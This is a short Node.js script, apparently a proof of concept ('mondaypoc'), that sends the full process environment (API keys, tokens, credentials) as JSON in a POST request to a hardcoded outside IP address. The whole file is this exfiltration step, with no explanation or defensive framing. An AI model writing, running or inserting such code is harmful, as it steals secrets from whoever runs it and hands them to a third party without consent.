import fetch from 'node-fetch'
fetch('http://142.93.236.12/?mondaypoc=123412', {
  method: 'POST',
  headers: {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(process.env)
}).then(res => res.json())
  .then(res => console.log(res));
